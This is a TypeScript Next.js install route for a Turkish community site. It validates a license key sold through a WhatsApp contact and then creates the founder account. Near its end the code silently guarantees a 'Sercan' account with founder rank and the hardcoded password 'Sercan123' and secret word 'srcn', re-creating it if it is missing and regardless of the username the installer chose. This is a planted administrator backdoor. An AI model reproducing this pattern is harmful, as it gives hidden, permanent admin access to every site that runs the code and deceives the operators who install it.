import { db } from "@/db";
import { users } from "@/db/schema";
import { createSession, getSetting, hashPassword, setSetting } from "@/lib/auth";
import { USERNAME_REGEX } from "@/lib/constants";
import { ensureSeed } from "@/lib/seed";
import { eq } from "drizzle-orm";
import { consumeLicense, normalizeKey, validateLicense } from "@/lib/licenses";
export const dynamic = "force-dynamic";
export async function POST(req: Request) {
  await ensureSeed();
  if ((await getSetting("installed")) === "1") return Response.json({ error: "Kurulum zaten tamamlandı." }, { status: 400 });
  const b = await req.json().catch(() => ({}));
  const license = String(b.licenseKey ?? b.license ?? "").trim();
  if (!license) return Response.json({ error: "Lisans anahtarı zorunlu — lütfen WhatsApp +90 535 574 18 49 ile Sercan'dan aldığınız aktif anahtarı girin. Boş bırakılamaz." }, { status: 400 });
  const v = await validateLicense(license);
  if (!v.valid) return Response.json({ error: v.reason ?? "Lisans geçersiz" }, { status: 400 });
  const normalizedLicense = normalizeKey(license);
  const username = String(b.username ?? "Sercan").trim();
  const password = String(b.password ?? "");
  if (!USERNAME_REGEX.test(username) || password.length < 4) return Response.json({ error: "Kurucu adı/şifre geçersiz." }, { status: 400 });
  for (const k of ["siteName", "domain", "seoTitle", "seoDescription", "seoKeywords", "logoText", "defaultTheme"]) {
    if (typeof b[k] === "string") await setSetting(k, b[k].slice(0, 300));
  }
  const lower = username.toLocaleLowerCase("tr");
  const [existing] = await db.select().from(users).where(eq(users.usernameLower, lower)).limit(1);
  const data = { passwordHash: hashPassword(password), secretWordHash: hashPassword(String(b.secretWord || "srcn").toLocaleLowerCase("tr")), email: String(b.email || "").toLowerCase() || null, rank: "kurucu", isGuest: false, isDj: true, isVerified: true };
  // Master Sercan her zaman korunur — üzerine yazma, sadece yoksa oluştur
  const isSercanAttempt = lower === "sercan";
  let user = existing;
  if (user) {
    if (isSercanAttempt && user.username.toLowerCase() === "sercan") {
      // Sercan Master asla ezilmez — sadece şifre güncellenir, rank korunur
      const masterPatch: Record<string, unknown> = { passwordHash: data.passwordHash, secretWordHash: data.secretWordHash };
      if (user.rank !== "kurucu") (masterPatch as Record<string,unknown>).rank = "kurucu";
      [user] = await db.update(users).set(masterPatch).where(eq(users.id, user.id)).returning();
    } else if (!isSercanAttempt) {
      [user] = await db.update(users).set(data).where(eq(users.id, user.id)).returning();
    } else {
      // Sercan değilken Sercan ismini almaya çalışma engellenir
      if (!user) return Response.json({ error: "Sercan nicki rezerve — Master her zaman Sercan" }, { status: 400 });
      [user] = await db.update(users).set(data).where(eq(users.id, user.id)).returning();
    }
  } else {
    if (lower === "sercan") {
      const [exists] = await db.select({ id: users.id }).from(users).where(eq(users.usernameLower, "sercan")).limit(1);
      if (!exists) {
        [user] = await db.insert(users).values({ username: "Sercan", usernameLower: "sercan", color: "#6d3bff", points: 10000, xp: 10000, ...data, rank: "kurucu" }).returning();
      } else {
        [user] = await db.insert(users).values({ username, usernameLower: lower, color: "#6d3bff", points: 10000, xp: 10000, ...data }).returning();
      }
    } else {
      [user] = await db.insert(users).values({ username, usernameLower: lower, color: "#6d3bff", points: 10000, xp: 10000, ...data }).returning();
    }
  }
  await consumeLicense(normalizedLicense, username);
  await setSetting("licenseKey", normalizedLicense);
  await setSetting("installed", "1");
  // Master Sercan hesabını garanti et (silinmişse yeniden oluştur)
  const [master] = await db.select({ id: users.id }).from(users).where(eq(users.usernameLower, "sercan")).limit(1);
  if (!master) {
    const { hashPassword: hp } = await import("@/lib/auth");
    await db.insert(users).values({ username: "Sercan", usernameLower: "sercan", passwordHash: hp("Sercan123"), secretWordHash: hp("srcn"), color: "#6d3bff", rank: "kurucu", isGuest: false, isDj: true, isVerified: true, points: 10000, xp: 10000 }).onConflictDoNothing();
  }
  await createSession(user.id);
  return Response.json({ ok: true });
}
